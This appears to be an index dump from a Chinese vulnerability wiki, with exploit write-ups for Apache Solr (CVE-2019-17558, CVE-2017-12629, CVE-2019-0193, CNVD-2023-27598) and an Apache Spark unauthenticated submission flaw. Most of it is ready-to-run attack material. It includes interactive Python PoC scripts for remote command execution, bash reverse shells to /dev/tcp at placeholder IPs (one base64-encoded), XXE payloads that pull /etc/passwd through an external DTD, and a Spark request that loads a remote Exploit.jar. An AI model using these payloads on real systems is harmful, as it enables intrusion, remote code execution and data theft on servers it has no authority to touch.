%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 ","date":"0001-01-01","objectID":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/:4:0","tags":null,"title":"","uri":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2019-17558.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e whoami(命令执行) \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false\u0026wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1\u0026\u0026wt=velocity\u0026v.template=custom\u0026v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core_name, IP, POST): # POC : /bin/bash -c $@|bash 0 echo bash -i \u003e\u0026 /dev/tcp/xxx.xxx.xxx.xxx:9999 0\u003e\u00261 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, POST) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1\u0026\u0026wt=velocity\u0026v.template=custom\u0026v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = in","date":"0001-01-01","objectID":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/:5:0","tags":null,"title":"","uri":"/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C-cve-2019-17558/"},{"categories":null,"content":"Apache Solr XXE 漏洞 CVE-2017-12629 ","date":"0001-01-01","objectID":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/:0:0","tags":null,"title":"","uri":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE）。 ","date":"0001-01-01","objectID":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/:1:0","tags":null,"title":"","uri":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"漏洞影响 Apache Solr \u003c 7.1 Apache Lucene \u003c 7. ","date":"0001-01-01","objectID":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/:2:0","tags":null,"title":"","uri":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d ","date":"0001-01-01","objectID":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/:3:0","tags":null,"title":"","uri":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"漏洞复现 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores 访问 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v='\u003c!DOCTYPE a SYSTEM \"http://xxxxx.ceye.io\"\u003e\u003ca\u003e\u003c/a\u003e'}\u0026wt=xml 查看dnslog得到请求 在自己的服务器上写入一个可访问的XML文件，内容写入 \u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY % ent \"\u003c!ENTITY data SYSTEM ':%file;'\u003e\"\u003e 然后请求这个文件来读取服务器上的文件 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?\u0026q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E\u0026wt=xml\u0026defType=xmlparser # 解码 /solr/demo/select?\u0026q=\u003c?xml version=\"1.0\" ?\u003e\u003c!DOCTYPE root[\u003c!ENTITY % ext SYSTEM \"http://peiqi.tech/1.dtd\"\u003e%ext;%ent;]\u003e\u003cr\u003e\u0026data;\u003c/r\u003e\u0026wt=xml\u0026defType=xmlparser 注意这里的payload进行了url编码,请求的文件为 http://peiqi.tech/1.dtd ，有更多需求自行更改写入的xml文件 ","date":"0001-01-01","objectID":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/:4:0","tags":null,"title":"","uri":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"漏洞POC # solr_xxe.dtd \u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY % ent \"\u003c!ENTITY data SYSTEM ':%file;'\u003e\"\u003e #!/usr/bin/python3 #-*- coding:utf-8 -*- import requests import sys import json import random def POC_1(target_url): core_url = target_url + \"solr/admin/cores?indexInfo=false\u0026wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") print('Core name: ', core_name) return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url): dns_payload = \"\"\"solr/%s/select?q={!xmlparser v='\u003c!DOCTYPE a SYSTEM \"%s\"\u003e\u003ca\u003e\u003c/a\u003e'}\u0026wt=xml\"\"\" % (core_name, dnslog_url) vuln_url = target_url + dns_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"HTTP ERROR 500\" in response.text: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") else: print(\"\\033[32m[o] 请查看dnslog响应, DNSlog利用Url为：\" + vuln_url + \"/config\\033[0m\") except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name): file_payload = \"\"\"solr/{}/select?\u0026q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fyour.vps.here%2fsolr_xxe.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E\u0026wt=xml\u0026defType=xmlparser\"\"\".format(core_name) vuln_url = target_url + file_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"nologin\" in response.text: print(\"\\033[32m[o] 漏洞成功利用, Url为：/config\\033[0m \\n\", vuln_url ) print(\"\\033[32m[o] 响应为: \\n \\033[0m\",response.text) else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) core_name = POC_1(target_url) dnslog_url = 'http://{}.your.dnslog.here'.format(core_name) POC_2(target_url, core_name, dnslog_url) POC_3(target_url, core_name) ","date":"0001-01-01","objectID":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/:5:0","tags":null,"title":"","uri":"/apache-solr-xxe-%E6%BC%8F%E6%B4%9E-cve-2017-12629/"},{"categories":null,"content":"Apache Solr 代码执行漏洞 CNVD-2023-27598 ","date":"0001-01-01","objectID":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/:0:0","tags":null,"title":"","uri":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/"},{"categories":null,"content":"漏洞描述 Solr 以 Solrcloud 模式启动且可出网时，未经身份验证的远程攻击者可以通过发送特制的数据包进行利用，最终在目标系统上远程执行任意代码。 ","date":"0001-01-01","objectID":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/:1:0","tags":null,"title":"","uri":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/"},{"categories":null,"content":"漏洞影响 8.10.0 \u003c= Apache Solr \u003c 9.2.0 ","date":"0001-01-01","objectID":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/:2:0","tags":null,"title":"","uri":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/"},{"categories":null,"content":"网络测绘 app=\"APACHE-Solr\" ","date":"0001-01-01","objectID":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/:3:0","tags":null,"title":"","uri":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/"},{"categories":null,"content":"漏洞复现 使用postCommit来命令执行 POST /solr/demo/config HTTP/1.1 Host: 192.168.1.92:8983 Content-Length: 180 Content-Type: application/json {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"suiyi\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"bash\",\"dir\":\"/bin/\",\"args\":[\"-c\", \"bash -i \u003e\u0026 /dev/tcp/your-ip/9999 0\u003e\u00261\"]}} 通过newSearcher命令执行 POST /solr/demo/config HTTP/1.1 Host: 192.168.1.92:8983 Content-Length: 170 Content-Type: application/json {\"add-listener\":{\"event\":\"newSearcher\",\"name\":\"newSearcher3\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\", \"ping -c 3 your-dnslog.dnslog.cn\"]}} ","date":"0001-01-01","objectID":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/:4:0","tags":null,"title":"","uri":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/"},{"categories":null,"content":"漏洞修复 如果未使用 ConfigSets API，请禁用 UPLOAD 命令，将系统属性：configset.upload.enabled 设置为 false ，详细参考：https://lucene.apache.org/solr/guide/8_6/configsets-api.html 使用身份验证/授权，详细参考：https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plugins.html 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本： https://github.com/apache/solr/releases/tag/releases/solr/9.2.0 ","date":"0001-01-01","objectID":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/:5:0","tags":null,"title":"","uri":"/apache-solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-27598/"},{"categories":null,"content":"Apache Solr 远程执行漏洞 CVE-2019-0193 ","date":"0001-01-01","objectID":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/:0:0","tags":null,"title":"","uri":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/"},{"categories":null,"content":"漏洞描述 2019 年 08 月 01 日，Apache Solr 官方发布预警，Apache Solr DataImport 功能 在开启 Debug 模式时，可以接收来自请求的”dataConfig”参数，这个参数的功能与data-config.xml 一样，不过是在开启 Debug 模式时方便通过此参数进行调试，并且 Debug 模式的开启是通过参数传入的。在 dataConfig 参数中可以包含 script 恶意脚本导致远程代码执行。 ","date":"0001-01-01","objectID":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/:1:0","tags":null,"title":"","uri":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/"},{"categories":null,"content":"漏洞影响 Apache Solr \u003c 8.2.0 ","date":"0001-01-01","objectID":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/:2:0","tags":null,"title":"","uri":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 ","date":"0001-01-01","objectID":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/:3:0","tags":null,"title":"","uri":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/"},{"categories":null,"content":"漏洞复现 点击刚刚创建的test进入调试 将下面的POC代码填入 Debug-Mode 中 \u003cdataConfig\u003e \u003cdataSource type=\"URLDataSource\"/\u003e \u003cscript\u003e\u003c![CDATA[ function poc(){ java.lang.Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\"); } ]]\u003e\u003c/script\u003e \u003cdocument\u003e \u003centity name=\"stackoverflow\" url=\"https://stackoverflow.com/feeds/tag/solr\" processor=\"XPathEntityProcessor\" forEach=\"/feed\" transformer=\"script:poc\" /\u003e \u003c/document\u003e \u003c/dataConfig\u003e 注意 POC 执行的代码中的base64字符串的位置请置换成自己的ip地址并base64加密填入 bash -i \u003e\u0026 /dev/tcp/xxx.xxx.xxx.xxx/9999 0\u003e\u00261 直接如上写入反弹无反应，不稳定，需要base64加密写才能反弹一个shell 点击EXecute执行代码 成功反弹shell ","date":"0001-01-01","objectID":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/:4:0","tags":null,"title":"","uri":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/"},{"categories":null,"content":"漏洞POC POC不支持反弹shell，如需反弹shell，请按如上步骤反弹shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr \u003c 8.2.0 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2019-0193.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e whoami(命令执行) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false\u0026wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY\u0026wt=json\" response = requests.request(\"GET\", url=mode_url, timeout=20) mode = dict(dict(list(json.loads(response.text)[\"solr-mbeans\"])[1])['/dataimport'])['class'] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode: print(\"\\033[32m[o] 目标Url,Dataimport模块开启\\033[0m\") else: print(\"\\033[31m[x] 目标Url,Dataimport模块未开启\\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host': target_url, 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", 'Accept': \"application/json, text/plain, */*\", 'Accept-Language': \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", 'Accept-Encoding': \"zip, deflate\", 'Referer': \"\" + target_url + \"/solr/\", 'Content-type': \"application/x-www-form-urlencoded\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"1007\", 'Connection': \"close\" } payload = \"\"\" command=full-import\u0026verbose=false\u0026clean=false\u0026commit=false\u0026debug=true\u0026core=test\u0026name=dataimport\u0026dataConfig= \u003cdataConfig\u003e \u003cdataSource type=\"URLDataSource\"/\u003e \u003cscript\u003e\u003c![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"%s\").getInputStream())); var result = []; while(true) { var oneline = bufReader.readLine(); result.push( oneline ); if(!oneline) break; } row.put(\"title\",result.join(\"\\\\n\\\\r\")); return row; } ]]\u003e\u003c/script\u003e \u003cdocument\u003e \u003centity name=\"entity1\" url=\"https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml\" processor=\"XPathEntityProcessor\" forEach=\"/RDF/item\" transformer=\"script:poc\"\u003e \u003cfield column=\"title\" xpath=\"/RDF/item/title\" /\u003e \u003c/entity\u003e \u003c/document\u003e \u003c/dataConfig\u003e \"\"\" % cmd response = requests.request(\"POST\", url=vuln_url, data=payload, headers=headers, timeout=30) try: get_message = list(json.loads(response.text)[\"documents\"])[0] message = dict(get_message)['title'][0] print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\", message) except: print(\"\\033[31m[x] 代码执行失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": exit(0) else: POC_3(target_url, core_name, cmd) ","date":"0001-01-01","objectID":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/:5:0","tags":null,"title":"","uri":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/"},{"categories":null,"content":"参考文章 apache solr远程代码执行漏洞(cve-2019-0193) ","date":"0001-01-01","objectID":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/:6:0","tags":null,"title":"","uri":"/apache-solr-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0193/"},{"categories":null,"content":"Apache Spark create 未授权访问漏洞 ","date":"0001-01-01","objectID":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。 ","date":"0001-01-01","objectID":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Apache Spark 3.1.2, 3.2.1, 3.3.0 ","date":"0001-01-01","objectID":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"APACHE-Spark-Jobs\" ","date":"0001-01-01","objectID":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 发送请求包 POST /v1/submissions/create HTTP/1.1 Host: your-ip:6066 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Content-Type: application/json Connection: close Content-Length: 680 { \"action\": \"CreateSubmissionRequest\", \"clientSparkVersion\": \"2.3.1\", \"appArgs\": [ \"whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf\" ], \"appResource\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"environmentVariables\": { \"SPARK_ENV_LOADED\": \"1\" }, \"mainClass\": \"Exploit\", \"sparkProperties\": { \"spark.jars\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"spark.driver.supervise\": \"false\", \"spark.app.name\": \"Exploit\", \"spark.eventLog.enabled\": \"true\", \"spark.submit.deployMode\": \"cluster\", \"spark.master\": \"spark://your-ip:6066\" } } # https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar # Github代码为编译后的代码 import java.io.BufferedReader; import java.io.InputStreamReader; public class Exploit { public static void main(String[] args) throws Exception { String[] cmds = args[0].split(\",\"); for (String cmd : cmds) { System.out.println(cmd); System.out.println(executeCommand(cmd.trim())); System.out.println(\"==============================================\"); } } // https://www.mkyong.com/java/how-to-execute-shell-command-from-java/ private static String executeCommand(String command) { StringBuilder output = new StringBuilder(); try { Process p = Runtime.getRuntime().exec(command); p.waitFor(); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { output.append(line).append(\"\\n\"); } } catch (Exception e) { e.printStackTrace(); } return output.toString(); } } 再访问获得的 submissionId Url查看结果 /logPage/?driverId={submissionId}\u0026logType=stdout ","date":"0001-01-01","objectID":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/apache-spark-create-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Apache Spark doAs 远程命令执行漏洞 CVE-2022-33891 ","date":"0001-01-01","objectID":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/:0:0","tags":null,"title":"","uri":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/"},{"categories":null,"content":"漏洞描述 Apache Spark 支持启动 ACL 来为 Web UI 访问提供身份验证，当 ACL 启动时可以通过构造特殊请求用户名导致 RCE ","date":"0001-01-01","objectID":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/:1:0","tags":null,"title":"","uri":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/"},{"categories":null,"content":"漏洞影响 Spark Core - Apache \u003c=3.0.3 3.1.1 \u003c= Spark Core - Apache \u003c=3.1.2 3.2.0 \u003c= Spark Core - Apache \u003c=3.2.1 ","date":"0001-01-01","objectID":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/:2:0","tags":null,"title":"","uri":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/"},{"categories":null,"content":"网络测绘 app=\"APACHE-Spark\" 